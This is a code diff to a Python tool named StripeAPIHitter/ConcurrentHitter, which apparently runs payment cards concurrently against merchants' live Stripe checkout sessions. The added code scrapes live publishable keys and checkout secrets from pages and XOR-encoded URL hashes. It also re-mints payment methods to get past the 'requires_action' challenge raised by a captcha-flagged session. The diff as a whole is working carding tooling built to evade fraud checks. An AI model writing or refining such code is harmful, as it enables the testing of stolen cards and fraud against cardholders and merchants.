@@ -1703,6 +1703,21 @@ class StripeAPIHitter:
                                                 "client_secret": self.cs_live
                                             }
                                         else:
+                                            # Re-mint a fresh PM — the original pm_id was created during
+                                            # the captcha-challenged session context. Reusing it on the
+                                            # re-confirm causes Stripe to re-issue requires_action because
+                                            # the PM is still associated with the challenge fingerprint.
+                                            fresh_pm_data = pm_data.copy()
+                                            fresh_pm_headers = headers.copy()
+                                            fresh_pm_headers["Idempotency-Key"] = str(uuid.uuid4())
+                                            try:
+                                                fresh_pm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(
+                                                    pm_url, headers=fresh_pm_headers, data=fresh_pm_data, timeout=30))
+                                                fresh_pm_json = fresh_pm_res.json()
+                                                if fresh_pm_json.get('id'):
+                                                    pm_id = fresh_pm_json['id']
+                                            except Exception:
+                                                pass  # keep existing pm_id as fallback
                                             reconfirm_data = {
                                                 "payment_method": pm_id,
                                                 "expected_payment_method_type": "card",
@@ -2057,7 +2072,7 @@ class ConcurrentHitter:
                     
                     cs_token = StripeAPIExtractor.extract_cs_live(final_url, html)
                     pk_key = None
-                    
+
                     # Try hash fragment decode first
                     check_url = final_url if '#' in final_url else self.url
                     hash_idx = check_url.find('#')
@@ -2068,7 +2083,10 @@ class ConcurrentHitter:
                             raw_bytes = base64.b64decode(decoded + '==')
                             json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
                             data = _json.loads(json_str)
-                            pk_key = data.get('apiKey')
+                            hash_pk = data.get('apiKey')
+                            # Only trust if it's a live key — pk_test_ causes requires_action loop on live sessions
+                            if hash_pk and hash_pk.startswith('pk_live_'):
+                                pk_key = hash_pk
                         except: pass
                     if not pk_key:
                         pk_key = StripeAPIExtractor.extract_pk_live(html)
@@ -2122,6 +2140,10 @@ class ConcurrentHitter:
             except: pass
 
         if cs_token and pk_key:
+            # Only trust hash pk if it is actually a live key — hash can carry pk_test_ which silently
+            # cross-contaminates a live cs_live session and produces requires_action loop forever
+            if pk_key.startswith('pk_test_'):
+                pk_key = None  # Discard — fall through to HTML scrape
             if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Instantly extracted Stripe keys..."})
             self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'stripe_account': stripe_account, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
             api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key, stripe_account=stripe_account)
@@ -2160,7 +2182,15 @@ class ConcurrentHitter:
                 cs_token = StripeAPIExtractor.extract_cs_live(self.url, html)
                 
                 hash_details = StripeAPIExtractor.extract_details_from_url_hash(self.url)
-                pk_key = hash_details.get('pk_key') or StripeAPIExtractor.extract_pk_live(html)
+                hash_pk = hash_details.get('pk_key')
+                html_pk = StripeAPIExtractor.extract_pk_live(html)
+                # Only trust hash pk if it is a live key — pk_test_ from hash cross-contaminates live sessions
+                if hash_pk and hash_pk.startswith('pk_live_'):
+                    pk_key = hash_pk
+                elif html_pk:
+                    pk_key = html_pk
+                else:
+                    pk_key = hash_pk  # last resort, whatever we have
                 stripe_account = hash_details.get('stripe_account')
                 
                 self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'stripe_account': stripe_account, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
